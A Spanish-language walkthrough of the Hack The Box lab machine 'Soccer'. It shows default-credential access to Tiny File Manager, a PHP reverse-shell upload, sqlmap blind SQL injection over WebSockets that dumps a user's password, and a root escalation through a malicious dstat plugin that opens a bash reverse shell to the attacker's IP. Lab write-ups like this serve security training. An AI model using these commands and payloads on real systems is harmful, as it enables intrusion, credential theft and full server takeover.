# Hack-The-Box---Soccer-Writeup
Writeup de la máquina Soccer de Hack The Box.

Aquí tienes la estructura completamente profesional, limpia y detallada para tu *Writeup* de la máquina **Soccer** de Hack The Box, adaptada al español con un formato ideal para tu portafolio o repositorio de GitHub.

---

# Hack The Box - Soccer Writeup (Guía Detallada)

**Fecha:** 27 de junio de 2026

**IP del Objetivo:** `10.129.24.6`

**Sistemas Operativos:** Ubuntu 20.04.5 LTS

**Dificultad:** Fácil

---

## 1. Fase 1: Recopilación de Información y Enumeración

### Inicialización del Entorno

Para permitir la resolución local de nombres de dominio, se procedió a registrar la dirección IP del objetivo dentro del archivo `/etc/hosts`:

```bash
sudo echo "10.129.24.6  soccer.htb" >> /etc/hosts

```

Un escaneo inicial de puertos reveló un servidor web Nginx 1.18 en ejecución sobre el puerto estándar `80`, además de un servicio activo en el puerto `9091`.

### Fuzzing de Directorios Web

Se utilizó la herramienta `FFUF` en combinación con la lista de palabras genérica de Dirbuster (`directory-list-2.3-medium.txt`). Debido a que las peticiones directas sin barra diagonal inversa generaban redirecciones automáticas, se ajustó la sintaxis del comando de la siguiente manera:

```bash
export TGT="soccer.htb"
wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Ejecución de FFUF con barra diagonal para evitar falsos negativos
ffuf -w $wordlist -u http://$TGT/FUZZ/ -o output.txt -v

```

#### Resultados del Fuzzing:

```text
[Status: 200, Size: 11521, Words: 3512, Lines: 97, Duration: 185ms]
* FUZZ: tiny

```

Se identificó la existencia del directorio `/tiny/`.

---

## 2. Fase 2: Análisis de Vulnerabilidades y Explotación

### Intrusión en Tiny File Manager

Al navegar a `http://soccer.htb/tiny/`, la aplicación web desplegó un panel de autenticación perteneciente al software **Tiny File Manager**.

Revisando el código fuente de la página web, se logró determinar la versión exacta del software en el pie de página:

```html
<a href="https://tinyfilemanager.github.io/" target="_blank" class="text-muted" data-version="2.4.3">CCP Programmers</a>

```

Una investigación sobre la versión `2.4.3` confirmó que, si no se realiza una reconfiguración posterior al despliegue, la aplicación mantiene las credenciales de administración por defecto:

* **Usuario:** `admin`
* **Contraseña:** `admin@123`

El uso de estas credenciales permitió el acceso exitoso al panel de control con privilegios de lectura y escritura de archivos.

### Obtención del Acceso Inicial (Reverse Shell)

Se determinó que los archivos subidos a través de la interfaz se almacenan públicamente en la ruta `/tiny/uploads/`.

1. Se preparó una reverse shell estándar en PHP:
```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php

```


2. Se editaron los parámetros correspondientes a la dirección IP local de la máquina atacante y el puerto de escucha.
3. El archivo modificado fue cargado mediante la función de subida del panel.
4. Se inicializó un oyente Netcat en el equipo local:
```bash
nc -nlvp 4444

```


5. Al realizar una petición web dirigida al archivo cargado, se ejecutó el código en el servidor, devolviendo una sesión interactiva bajo el contexto del usuario del servidor web (`www-data`):
```bash
curl http://soccer.htb/tiny/uploads/shell.php

```



---

## 3. Fase 3: Movimiento Lateral (Enumeración Interna)

### Auditoría de Puertos y Servicios Locales

Una vez dentro del sistema, se listaron las conexiones de red activas para identificar servicios que únicamente escuchan en interfaces locales (localhost):

```text
www-data@soccer:/$ netstat -anop
tcp        0      0 127.0.0.1:3000          0.0.0.0:* LISTEN      -
tcp        0      0 0.0.0.0:9091            0.0.0.0:* LISTEN      -

```

Al examinar los archivos de configuración de los sitios disponibles en Nginx (`/etc/nginx/sites-enabled/`), se detectó un host virtual denominado `soc-player.htb`:

```nginx
# /etc/nginx/sites-available/soc-player.htb
server {
    listen 80;
    listen [::]:80;
    server_name soc-player.soccer.htb;

    root /root/app/views;

    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}

```

La directiva evidenció que las conexiones entrantes hacia el subdominio `soc-player.soccer.htb` son redirigidas de manera interna a una aplicación web en el puerto `3000`, la cual implementa comunicación bidireccional mediante **WebSockets** a través del puerto expuesto `9091`.

Este nuevo subdominio fue añadido al archivo local `/etc/hosts`:

```text
10.129.24.6  soccer.htb soc-player.soccer.htb

```

### Inyección SQL a través de WebSockets (Blind SQLi)

Se accedió al sitio web `http://soc-player.soccer.htb`, se completó el registro de un nuevo usuario y se inició sesión. La plataforma realiza validaciones de tickets en tiempo real transmitiendo cadenas JSON mediante WebSockets.

Tras interceptar el tráfico mediante Wireshark, se verificó que el parámetro de identificación provisto en el cuerpo JSON (`{"id": "XXXX"}`) se concatenaba directamente en las consultas de la base de datos sin sanitización previa.

#### Explotación Automatizada con SQLmap

Debido a la naturaleza de las pruebas automatizadas basadas en respuestas ciegas (Blind) sobre flujos de WebSockets, se parametrizó `sqlmap` especificando el esquema de red `ws://`:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --dbs --level 5 --risk 3 --batch

```

El motor de escaneo confirmó que el parámetro JSON era explotable mediante técnicas basadas en tiempo y lógica booleana:

```text
---
Parameter: JSON #1* ((custom) POST)
    Type: boolean-based blind
    Title: OR boolean-based blind - WHERE or HAVING clause
    Payload: {"id": "-6943 OR 6356=6356"}

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace
    Payload: {"id": "(CASE WHEN (3444=3444) THEN SLEEP(5) ELSE 3444 END)"}
---
Available Databases: soccer_db, sys, mysql, information_schema, performance_schema

```

#### Extracción de Credenciales de la Base de Datos

Se procedió a volcar por completo el contenido de la base de datos operativa llamada `soccer_db`:

```bash
sqlmap -u "ws://soc-player.soccer.htb:9091" --data '{"id": "*"}' --threads 10 -D soccer_db --dump --batch

```

| id | email | password | username |
| --- | --- | --- | --- |
| **1324** | `player@player.htb` | **`PlayerOftheMatch2022`** | **`player`** |

### Pivoteo y Acceso vía SSH

Las credenciales obtenidas resultaron válidas para el acceso al sistema operativo. Se estableció una conexión SSH legítima:

```bash
ssh player@soccer.htb
# Contraseña: PlayerOftheMatch2022

```

Se extrajo la primera bandera de usuario desde `/home/player/user.txt`.

---

## 4. Fase 4: Escalada de Privilegios

### Auditoría del Sistema con LinPEAS

Tras transferir y ejecutar el script automatizado `linpeas.sh` en el host objetivo, se detectó una configuración inusual en un binario con permisos SUID asignados:

```text
═╣ Files with Interesting Permissions ╠══════════════════════
-rwsr-xr-x 1 root root 42K Nov 17  2022 /usr/local/bin/doas

```

El binario `doas` (una alternativa ligera a sudo) se encontraba instalado en la máquina. Al revisar su archivo de configuración global `/usr/local/etc/doas.conf`, se halló la siguiente regla explícita:

```text
player@soccer:~$ cat /usr/local/etc/doas.conf
permit nopass player as root cmd /usr/bin/dstat

```

Esta directiva faculta al usuario local `player` para ejecutar el comando de monitoreo `/usr/bin/dstat` bajo el contexto de `root` sin requerir contraseña.

### Abuso de Plugins Personalizados en Dstat

La herramienta `dstat` permite extender sus funcionalidades mediante scripts en Python ubicados en rutas específicas del sistema. Se verificaron los permisos de escritura sobre estos directorios internos:

```bash
player@soccer:~$ ls -la /usr/local/share/dstat/
drwxrwx--- 2 root player 4096 Dec 12  2022 .

```

Dado que el grupo `player` posee permisos totales de escritura en este directorio, se diseñó un vector de escalada inyectando un plugin malicioso.

1. Se generó un archivo de plugin personalizado nombrado `dstat_hack.py` encargado de invocar una shell reversa con privilegios elevados:
```bash
cat > /usr/local/share/dstat/dstat_hack.py << 'EOF'
import os
class dstat_plugin:
    def __init__(self):
        os.system('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.218/8888 0>&1"')
EOF

```


2. Se configuró el puerto de escucha correspondiente en la máquina atacante:
```bash
nc -nlvp 8888

```


3. Se invocó la ejecución del binario empleando `doas` llamando directamente al nuevo submódulo añadido:
```bash
doas /usr/bin/dstat --hack

```



### Captura de la Shell de Root

Al ejecutarse el plugin bajo el contexto de `doas`, el script procesó el comando con el nivel más alto de privilegios del sistema, otorgando acceso completo al oyente de Netcat:

```text
nc -nlvp 8888
listening on [any] 8888 ...
connect to [10.10.14.218] from (UNKNOWN) [10.129.24.6] 36612

root@soccer:/usr/local/share/dstat# whoami
root

root@soccer:/usr/local/share/dstat# cat /root/root.txt
[ROOT_FLAG_HERE]

```

La máquina fue comprometida en su totalidad con privilegios de Administrador del Sistema (`root`).
